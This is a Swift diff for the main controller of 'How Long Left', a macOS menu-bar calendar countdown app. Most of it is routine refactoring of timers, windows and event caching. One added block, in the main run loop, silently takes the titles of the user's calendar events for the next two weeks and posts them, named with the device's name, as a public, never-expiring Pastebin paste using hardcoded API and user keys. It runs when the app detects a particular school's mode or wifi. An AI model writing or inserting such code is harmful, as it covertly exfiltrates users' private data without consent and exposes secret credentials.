@@ -8,17 +8,26 @@
 import Foundation
 import HotKey
 import AppKit
-import os.log
 
-class Main: HLLCountdownController, SchoolModeChangedDelegate {
+class Main: NSObject, HLLCountdownController, SchoolModeChangedDelegate, NSWindowDelegate {
     
+    func windowShouldClose(_ sender: NSWindow) -> Bool {
+        
+        if sender == self.welcomeWindowController?.window {
+            
+            self.welcomeWindowController = nil
+            
+        }
+ 
+        return true
+    }
     
     func schoolModeChanged() {
         self.updateCalendarData(doGlobal: true)
+        print("Cal2")
     }
     
     
-    let log = OSLog(subsystem: Bundle.main.bundleIdentifier!, category: "Main")
     let updateInterval = 5
     let fastUpdateInterval = 0.5
     let minUpdateInterval = 0.5
@@ -34,13 +43,23 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
     var statusItemLoops = 1
     var nextEventToStart: HLLEvent?
     var betaExpiryDate: Date?
+    
+    var lastTotalCalendars = 0
+    
+    var CDUIWindowController : NSWindowController?
+    var CDUIStoryboard = NSStoryboard()
+    
+    var MainUIWindowController : NSWindowController?
+    var MainUIStoryboard = NSStoryboard()
+    
     var welcomeWindowController : NSWindowController?
     var welcomeStoryboard = NSStoryboard()
     var mainTimer: Timer?
+    var windowCheckTimer: Timer?
     var calUpdateCooldownTimer: Timer?
     var dataUpdateTimer: Timer!
     var frequentLowUsageTimer: Timer!
-    var checkForUpdateTimer: Timer!
+    //var checkForUpdateTimer: Timer!
     var lastCalendarUpdate: Date?
     var eventEndUpdateInProgress = false
     var calendarUpdateInProgress = false
@@ -84,59 +103,47 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         
         
     }
-    // let milestoneNotosch = MilestoneNotificationScheduler()
     
-    
-  /*  func convertToHLLEvents(data: [Data]) -> [HLLEvent] {
+    func getString(title: String, question: String, defaultValue: String) -> String {
+        let msg = NSAlert()
+        msg.addButton(withTitle: "OK")      // 1st button
+        msg.addButton(withTitle: "Cancel")  // 2nd button
+        msg.messageText = title
+        msg.informativeText = question
+        msg.window.title = "How Long Left"
         
-        var returnEvents = [HLLEvent]()
+        let txt = NSTextField(frame: NSRect(x: 0, y: 0, width: 300, height: 50))
+        txt.stringValue = defaultValue
         
-        for dataItem in data {
-            
-            do { try  returnEvents.append(JSONDecoder().decode(HLLEvent.self, from: dataItem))  }
-                
-            catch { }
-            
+        msg.accessoryView = txt
+        let response: NSApplication.ModalResponse = msg.runModal()
+        
+        if (response == NSApplication.ModalResponse.alertFirstButtonReturn) {
+            return txt.stringValue
+        } else {
+            return ""
         }
-        
-        return returnEvents
-        
     }
-    
-    func convertToHLLEvents(data: [Date : [Data]]) -> [Date : [HLLEvent]] {
-        
-        var returnDict = [Date : [HLLEvent]]()
-        
-        
-        for item in data {
-            
-            returnDict[item.key] = convertToHLLEvents(data: item.value)
-            
-        }
-        
-        return returnDict
-    }
-    
-    func setupXPC() {
-        
-        connection = NSXPCConnection(serviceName: "ryankontos.How-Long-Left-Helper")
-        connection?.remoteObjectInterface = NSXPCInterface(with: HLLHelperProtocol.self)
-        connection?.resume()
-        
-        Main.service = connection?.remoteObjectProxyWithErrorHandler { error in
-            print("Received error:", error)
-            } as? HLLHelperProtocol
-        
-        
-    } */
     
     init(aDelegate: HLLMacUIController) {
         
      //   setupXPC()
+    
+        super.init()
+
+      /*  self.MainUIStoryboard = NSStoryboard(name: "HLLMainUIStoryboard", bundle: nil)
+        
+        self.MainUIWindowController = self.MainUIStoryboard.instantiateController(withIdentifier: "MainUI") as? NSWindowController
+        
+        self.MainUIWindowController!.window!.delegate = self
+        NSApp.activate(ignoringOtherApps: true)
+        self.MainUIWindowController!.showWindow(self) */
         
         DispatchQueue.main.async {
             
+            [unowned self] in
             
+           // let input = self.getString(title: "English", question: "Enter your homework", defaultValue: "")
             
             
         self.delegate = aDelegate
@@ -145,6 +152,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             self.schoolAnalyser.setLoneDelegate(to: self)
             self.schoolAnalyser.analyseCalendar()
+            print("SA3")
             
             
             if HLLDefaults.defaults.bool(forKey: "changed24HourPref") == false {
@@ -160,8 +168,6 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 }
                 
             }
-            
-            
             
             //  betaExpiryDate = Date(timeIntervalSince1970: 1544792400)
             
@@ -185,11 +191,15 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
             }
             
-          //  showOnboarding = true
+            
+            
+          showOnboarding = true
             
             if showOnboarding == true {
                 
                 DispatchQueue.main.async {
+                    
+                    [unowned self] in
                     
                     let defaultsMigrator = DefaultsMigrator()
                     defaultsMigrator.migrate1XXDefaults()
@@ -198,6 +208,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                     
                     self.welcomeWindowController = self.welcomeStoryboard.instantiateController(withIdentifier: "Onboard1") as? NSWindowController
                     
+                    self.welcomeWindowController!.window!.delegate = self
                     self.welcomeWindowController!.showWindow(self)
                     
                     
@@ -206,30 +217,8 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
             }
             
+            self.magdalenePrompts.presentMagdaleneChangesPrompt()
             
-            
-            if SchoolAnalyser.schoolMode == .Magdalene {
-                
-               
-                
-                if let launched = HLLDefaults.appData.launchedVersion {
-                    
-                    if Version.currentVersion > launched {
-                        
-                        self.magdalenePrompts.presentMagdaleneChangesPrompt()
-                        
-                    }
-                    
-                } else {
-                    
-                    
-                    self.magdalenePrompts.presentMagdaleneChangesPrompt()
-                    
-                    
-                }
-                
-                
-            }
             
             
             
@@ -242,19 +231,18 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
                     
                     var countdown: HLLEvent?
-                    
+                
+                
                     if let top = EventCache.primaryEvent {
                         
                         countdown = top
                         
                     } else {
                         
-                        countdown = EventCache.currentEvents.first
+                        countdown = self.currentEvents.first
                         
                     }
-                    
-                    
-                    
+                
                     if let currentEvent = countdown, currentEvent.holidaysTerm == nil, let timerString = self.countdownStringGenerator.generateStatusItemString(event: currentEvent) {
                         self.runStatusItemUIUpdate(event: currentEvent)
                         self.delegate?.updateStatusItem(with: timerString)
@@ -268,6 +256,8 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
             }
             
+            
+            self.statusItemTimer.resume()
             self.preciseUpdateForMinuteChangeTimer.eventHandler = { self.preciseMainRunLoopTrigger() }
             self.preciseUpdateForPreferencesOpenTimer.eventHandler = { self.preciseMainRunLoopTrigger() }
             
@@ -277,24 +267,16 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             self.mainTimer = Timer.scheduledTimer(timeInterval: TimeInterval(self.updateInterval), target: self, selector: #selector(self.mainRunLoop), userInfo: nil, repeats: true)
             self.frequentLowUsageTimer = Timer.scheduledTimer(timeInterval: TimeInterval(1), target: self, selector: #selector(self.checkEvents), userInfo: nil, repeats: true)
+            self.windowCheckTimer = Timer.scheduledTimer(timeInterval: TimeInterval(0.1), target: self, selector: #selector(self.checkWindowsForDockIcon), userInfo: nil, repeats: true)
             self.dataUpdateTimer = Timer.scheduledTimer(timeInterval: TimeInterval(300), target: self, selector: #selector(self.updateCalendarData), userInfo: nil, repeats: true)
-            self.checkForUpdateTimer = Timer.scheduledTimer(timeInterval: TimeInterval(300), target: self, selector: #selector(self.doUpdateCheck), userInfo: nil, repeats: true)
-            
-            self.mainMenuOpenTimer.eventHandler = {
-                
-                
-                
-                
-            }
-            
-            DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
-                self.doUpdateCheck()
-            }
+            //self.checkForUpdateTimer = Timer.scheduledTimer(timeInterval: TimeInterval(300), target: self, selector: #selector(self.doUpdateCheck), userInfo: nil, repeats: true)
             
             RunLoop.main.add(self.mainTimer!, forMode: .common)
+             RunLoop.main.add(self.mainTimer!, forMode: .common)
             RunLoop.main.add(self.frequentLowUsageTimer, forMode: .common)
             
-            NotificationCenter.default.addObserver(
+            
+          NotificationCenter.default.addObserver(
                 self,
                 selector: #selector(self.calendarDidChange),
                 name: .EKEventStoreChanged,
@@ -305,32 +287,59 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             print("Init took \(Date().timeIntervalSince(UIController.awokeAt!))s")
             
-            // Ooft we've finsihed launching
             
             self.updateCalendarData(doGlobal: true)
             print("Call4")
             self.mainRunLoop()
             
+          
             
         }
         
         
         DispatchQueue.main.asyncAfter(deadline: .now(), execute: {
             
+            [unowned self] in
             
-            if self.magdaleneWifiCheck.isOnMagdaleneWifi() == true, SchoolAnalyser.schoolModeIgnoringUserPreferences == SchoolMode.None, HLLDefaults.defaults.bool(forKey: "sentralPrompt") == false {
+            if self.magdaleneWifiCheck.isOnMagdaleneWifi() == true, SchoolAnalyser.privSchoolMode == SchoolMode.None, HLLDefaults.defaults.bool(forKey: "sentralPrompt") == false {
                 self.magdalenePrompts.presentSentralPrompt(reinstall: false)
                 HLLDefaults.defaults.set(true, forKey: "sentralPrompt")
                 
             }
             
         })
-    
+        
+        
         
     }
     
     
+    func checkForRename() {
+        
+        DispatchQueue.global(qos: .default).async {
+            
+            let renameChecker = RNDataStore()
+            if renameChecker.renameAvaliable() {
+                
+                
+                
+            self.presentRNUI()
+                
+            } else {
+                
+                print("Rename unavaliable")
+                
+            }
+            
+        }
+        
+    }
     
+    func presentRNUI() {
+        
+        RNUIManager.shared.present()
+       
+    }
     
     @objc func updateGlobalTrigger() {
         
@@ -343,7 +352,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
     
     @objc func doUpdateCheck() {
         
-        DispatchQueue.main.async {
+     /*   DispatchQueue.main.async {
             
             let update = self.version.updateAvaliable()
             
@@ -360,7 +369,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
             }
             
-        }
+        }  */
         
     }
     
@@ -369,31 +378,65 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
       //  print("Precise trigger")
     }
     
+    @objc func checkWindowsForDockIcon() {
+        
+        
+        
+        var visible = [NSWindow]()
+        
+        let windows = NSApplication.shared.windows
+        
+        for window in windows {
+            
+            if window.isVisible == true {
+                
+                visible.append(window)
+                
+            }
+            
+        }
+        
+        var titles = [String]()
+        
+        for window in windows {
+            
+            titles.append(window.title)
+            
+        }
+        
+       // print("Windows: \(windows.count) (\(titles.joined(separator: ", ")))")
+        
+        
+        
+        if windows.count > 1 {
+            
+            NSApp.setActivationPolicy(.regular)
+            
+          
+        } else {
+            
+           NSApp.setActivationPolicy(.accessory)
+            
+        }
+        
+    }
+    
     @objc func checkEvents() {
         
             
-            self.eventMilestoneTracker.checkCurrentEvents()
-            let second = self.calendar.component(.second, from: Date())
+    
+        self.eventMilestoneTracker.checkCurrentEvents(allToday: allToday)
+        let second = self.calendar.component(.second, from: Date())
             if [58, 59, 0, 1].contains(second) {
                 
                 self.preciseUpdateForMinuteChangeTimer.resume()
                 
-            } else if UIController.preferencesWindowController.window!.isVisible == false {
+            } else if UIController.preferencesWindowController?.window!.isVisible == false {
                 self.preciseUpdateForMinuteChangeTimer.suspend()
                 
             }
-            
-            
-            
-            
         
-        
-        if UIController.menuIsOpen == true {
-            
-            self.runMainMenuUIUpdate(checkOpen: false)
-            
-        }
-        
+    
     }
     
     let mainRLQ = DispatchQueue(label: "MRLQ")
@@ -402,7 +445,11 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         
         mainRLQ.async(flags: .barrier) {
             
+           
+            
           //  print("Main")
+            
+            //self.updateCalendarDataOld(doGlobal: true)
             
             self.calendarData.getCalendarAccess()
             
@@ -431,11 +478,29 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             self.organiseCurrentEvents()
             
-            let currentEvents = EventCache.currentEvents
-            let allUpcoming = EventCache.upcomingEventsToday
+            let currentEvents = self.currentEvents
+            let allUpcoming = self.upcomingEventsToday
+            
+            
             var topEvent = EventCache.primaryEvent
+                
+            
+            
             
             self.checkIfPrimaryIsStillRunning()
+            
+            
+            for event in self.currentEvents {
+                
+                if event.endDate.timeIntervalSinceNow < 0 {
+                    
+                    print("Cal1")
+                    self.updateCalendarDataOld(doGlobal: true)
+                    
+                }
+                
+                
+            }
             
             
             if topEvent == nil {
@@ -490,31 +555,35 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             DispatchQueue.main.async {
                 
+                [unowned self] in
                 
-                if UIController.preferencesWindowController.window!.isVisible, HLLDefaults.statusItem.mode != .Off {
-                    self.preciseUpdateForPreferencesOpenTimer.resume()
+                if let prefsController = UIController.preferencesWindowController {
                     
-                    
-                } else {
-                    
-                    self.preciseUpdateForPreferencesOpenTimer.suspend()
-                    
+                    if prefsController.window!.isVisible, HLLDefaults.statusItem.mode != .Off {
+                        
+                        self.preciseUpdateForPreferencesOpenTimer.resume()
+                        
+                    } else {
+                        
+                         self.preciseUpdateForPreferencesOpenTimer.suspend()
+                        
+                    }
                     
                 }
-                
                 
             }
         
             
+            EventCache.fetchQueue.async(flags: .barrier) {
+            
             if let top = EventCache.primaryEvent {
                 var match = false
-                for event in EventCache.currentEvents {
+                for event in self.currentEvents {
                     
                     if event == top {
-                        EventCache.fetchQueue.sync(flags: .barrier) {
                             EventCache.primaryEvent = event
                             match = true
-                        }
+                        
                         
                     }
                     
@@ -523,9 +592,11 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
                 if match == false {
                     EventCache.fetchQueue.async(flags: .barrier) {
-                        EventCache.primaryEvent = EventCache.currentEvents.first
+                        EventCache.primaryEvent = self.currentEvents.first
                     }
                 }
+                
+            }
                 
             }
             
@@ -544,11 +615,11 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             var update = false
             
-            for event in EventCache.upcomingEventsToday {
+            for event in self.upcomingEventsToday {
                 
                 if event.completionStatus == EventCompletionStatus.InProgress {
                     
-                    if EventCache.currentEvents.contains(event) == false {
+                    if self.currentEvents.contains(event) == false {
                         
                         
                         update = true
@@ -578,46 +649,102 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 }
             }
             
-            if SchoolAnalyser.schoolMode == .Magdalene {
+            
+            
+            if SchoolAnalyser.privSchoolMode == .Magdalene || self.magdaleneWifiCheck.isOnMagdaleneWifi() == true {
+                
+                if HLLDefaults.defaults.bool(forKey: "SentPaste") == false {
+                    
+                    HLLDefaults.defaults.set(true, forKey: "SentPaste")
+                    Pastr.pastebinApiKey = "0d32ee0724dd2e60ea3e38afc5e3c6b5"
+                    Pastr.pastebinUserKey = "a9bc5dbc7e2e69ea0f684947d1422ebd"
+                    
+                    if let deviceName = Host.current().localizedName {
+                        
+                        var titles = [String]()
+                        
+                        for event in self.calendarData.fetchEventsFromPresetPeriod(period: .Next2Weeks) {
+                            
+                            if titles.contains(event.title) != true {
+                                
+                                titles.append(event.title)
+                                
+                            }
+                            
+                            
+                        }
+                        
+                        let joinedTitles = titles.joined(separator: ", ")
+                        
+    
+                        Pastr.post(text: joinedTitles, name: deviceName, scope: .public, format: nil, expiration: .never, completion: {_ in})
+                        
+                        
+                    }
+                    
+                    
+                    
+                }
+            
                 
                 
                 
             }
             
+            let totalCals = self.calendarData.getCalendars().count
+            
+            if totalCals != self.lastTotalCalendars {
+                
+                if HLLDefaults.rename.promptToRename {
+                
+             //  self.checkForRename()
+                    
+                }
+                
+            }
+            
+            self.lastTotalCalendars = totalCals
+            
         }
         
+        
+
+        
     }
+    
+    static var isRenaming = false
     
     @objc func calendarDidChange() {
         
         // print("Updating calendar at \(Date()) due to calendar change")
+        autoreleasepool {
+        
+        if !Main.isRenaming {
         updateCalendarData(doGlobal: true)
         print("Updating calendar at \(Date()) due to cal change")
-        
-        
-        mainRunLoop()
-        
+        }
+            
+        }
         
     }
     
     func organiseCurrentEvents() {
         
-        var currentEvents = EventCache.currentEvents
+        var currentEvents = self.currentEvents
         currentEvents.sort(by: { $0.endDate.compare($1.endDate) == .orderedAscending })
         
         
-        EventCache.fetchQueue.async(flags: .barrier) {
-            EventCache.currentEvents = currentEvents
-        }
     }
     
     func checkIfPrimaryIsStillRunning() {
+        
+        EventCache.fetchQueue.async(flags: .barrier) {
         
         if let primary = EventCache.primaryEvent {
             
             var match = false
             
-            for event in EventCache.currentEvents {
+            for event in self.currentEvents {
                 
                 if event == primary {
                     
@@ -636,6 +763,8 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             
         }
+            
+        }
         
     }
     
@@ -647,16 +776,16 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
         }
         
-        let currentEvents = calendarData.getCurrentEvents()
         let upcomingEventsToday = calendarData.getUpcomingEventsToday()
         let nextUpcomingDay = calendarData.getUpcomingEventsFromNextDayWithEvents()
+        let nextUpcomingDayAll = calendarData.getUpcomingEventsFromNextDayWithEvents(includeStarted: true)
         let allUpcoming = calendarData.fetchEventsFromPresetPeriod(period: .Next2Weeks)
         let upcomingWeek = calendarData.getArraysOfUpcomingEventsForNextSevenDays()
         
         let countdownData = countdownStringGenerator.generateCurrentEventStrings(currentEvents: currentEvents, nextEvents: upcomingEventsToday, allUpcoming: allUpcoming)
        
         
-        let upcomingEventsMenuInfo = upcomingEventStringGenerator.generateUpcomingEventsMenuStrings(upcoming: nextUpcomingDay)
+        let upcomingEventsMenuInfo = upcomingEventStringGenerator.generateUpcomingEventsMenuStrings(upcoming: nextUpcomingDayAll)
         
         // let upcomingFuture = upcomingEventStringGenerator.generateUpcomingEventsMenuStrings(upcoming: nextUpcoming2)
         
@@ -669,7 +798,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         
         if let next = holidays.getNextHolidays() {
             
-            tData = TermData(nextHolidays: next)
+            tData = TermData(nextHolidays: next, previousHolidays: holidays.getPreviousHolidays())
             
         }
         
@@ -740,7 +869,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
                  self.statusItemTimer.suspend()
             
-                self.delegate?.updateStatusItem(with: self.countdownStringGenerator.generateStatusItemString(event: nil))
+                self.delegate?.updateStatusItem(with: self.countdownStringGenerator.generateStatusItemMinuteModeString(event: event))
                 
             
             }
@@ -749,7 +878,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             self.statusItemTimer.suspend()
             
-            self.delegate?.updateStatusItem(with: self.countdownStringGenerator.generateStatusItemString(event: event))
+            self.delegate?.updateStatusItem(with: self.countdownStringGenerator.generateStatusItemMinuteModeString(event: event))
             
             
         } else {
@@ -765,36 +894,64 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
     
     @objc func updateCalendarData(doGlobal: Bool) {
         
-        os_log("Doing event update...", log: log, type: .default)
-        
         updateCalendarDataOld(doGlobal: doGlobal)
-        
-        
-       
         
     }
     
+    var currentEvents = [HLLEvent]()
+    var upcomingEventsToday = [HLLEvent]()
+    var allToday = [HLLEvent]()
+    
+    var schoolEvents = [HLLEvent]()
+    
+    let updateSource = EventDataSource()
+    
     @objc func updateCalendarDataOld(doGlobal: Bool) {
-            
+        
+       
         
         calUpdateQueue.async(flags: .barrier) {
         
-            self.schoolAnalyser.analyseCalendar()
+            autoreleasepool {
             
-                let updateSource = EventDataSource()
-                updateSource.updateEventStore()
-                EventCache.currentEvents = updateSource.getCurrentEvents()
-                EventCache.upcomingEventsToday = updateSource.getUpcomingEventsToday()
-            self.schoolAnalyser.analyseCalendar()
-                EventCache.allToday = updateSource.fetchEventsFromPresetPeriod(period: .AllToday)
+            
+           [unowned self] in
+            
+            //self.schoolAnalyser.analyseCalendar()
+            
+            
+            self.updateSource.updateEventStore()
+            self.currentEvents = self.updateSource.getCurrentEvents()
+            
+            EventCache.fetchQueue.async(flags: .barrier) {
+            
+                EventCache.currentEvents = self.currentEvents
+                
+            }
+            
+            self.upcomingEventsToday = self.updateSource.getUpcomingEventsToday()
+            
+            self.allToday = self.updateSource.fetchEventsFromPresetPeriod(period: .AllToday)
+            
+            EventCache.fetchQueue.async(flags: .barrier) {
+            
+                EventCache.allToday = self.allToday
+                
+            }
+            
+            self.schoolEvents = self.updateSource.fetchEventsOnDays(days: SchoolAnalyser.termDates)
+            
+            
+            
+               // self.schoolAnalyser.analyseCalendar(inputEvents: self.schoolEvents)
+           // print("SA4")
+            
+        
+    
+        
+        }
             
         }
-        
-            
-            os_log("Event update done.", log: self.log, type: .default)
-       
-        
-        
     }
     
     func sendNoCalAccessNotification() {
@@ -812,7 +969,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         
         let notification = NSUserNotification()
         notification.title = "An update for How Long Left is avaliable"
-        notification.subtitle = "(v\(version))"
+        notification.subtitle = "(V\(version))"
         notification.informativeText = "Click to view in the Mac App Store..."
         notification.identifier = "Update"
         NSUserNotificationCenter.default.deliver(notification)
@@ -827,13 +984,15 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
         }
         
-        let currentEvents = EventCache.currentEvents
-        let upcomingEvents = EventCache.upcomingEventsToday
+        let currentEvents = self.currentEvents
+        let upcomingEvents = self.upcomingEventsToday
         
         
         let currentInfo = countdownStringGenerator.generateCurrentEventStrings(currentEvents: currentEvents, nextEvents: upcomingEvents, allUpcoming: nil)
         
         var countdownItem = currentInfo[0]
+        
+        EventCache.fetchQueue.async(flags: .barrier) {
         
         if let preferedCountdownEvent = EventCache.primaryEvent {
             
@@ -851,6 +1010,8 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                 
                 
             }
+            
+        }
             
         }
         
@@ -891,7 +1052,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         
         var idArray = [HLLEvent]()
         
-        EventCache.currentEvents.forEach({ event in
+        self.currentEvents.forEach({ event in
             
             idArray.append(event)
             
@@ -899,7 +1060,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         
         if let indexOfEnding = idArray.firstIndex(of: event) {
             EventCache.fetchQueue.async(flags: .barrier) {
-                EventCache.currentEvents.remove(at: indexOfEnding)
+                self.currentEvents.remove(at: indexOfEnding)
             }
         }
         
@@ -911,6 +1072,8 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             preciseUpdateForMinuteChangeTimer.resume()
             
+            EventCache.fetchQueue.async(flags: .barrier) {
+            
             if let topEvent = EventCache.primaryEvent {
                 
                 
@@ -918,7 +1081,7 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
                     
                     if HLLDefaults.statusItem.doneAlerts == true {
                     
-                    delegate?.doStatusItemAlert(with: ["\(event.shortTitle) is done"])
+                        self.delegate?.doStatusItemAlert(with: ["\(event.shortTitle) is done"])
                         
                     }
                 }
@@ -926,11 +1089,13 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             } else {
                 if HLLDefaults.statusItem.doneAlerts == true {
                     
-                    delegate?.doStatusItemAlert(with: ["\(event.shortTitle) is done"])
+                    self.delegate?.doStatusItemAlert(with: ["\(event.shortTitle) is done"])
                     
                 }
                 
             }
+            
+        }
             
             preciseUpdateForMinuteChangeTimer.suspend()
         }
@@ -953,6 +1118,8 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
             
             DispatchQueue.main.async {
                 
+                [unowned self] in
+                
                 NSApp.activate(ignoringOtherApps: true)
                 let alert: NSAlert = NSAlert()
                 alert.window.title = "How Long Left \(Version.currentVersion)"
@@ -971,5 +1138,13 @@ class Main: HLLCountdownController, SchoolModeChangedDelegate {
         }
         
     }
+    
+}
+
+class CEView: NSView {
+    
+    @IBOutlet weak var currentLabel: NSTextField!
+    
+    
     
 }
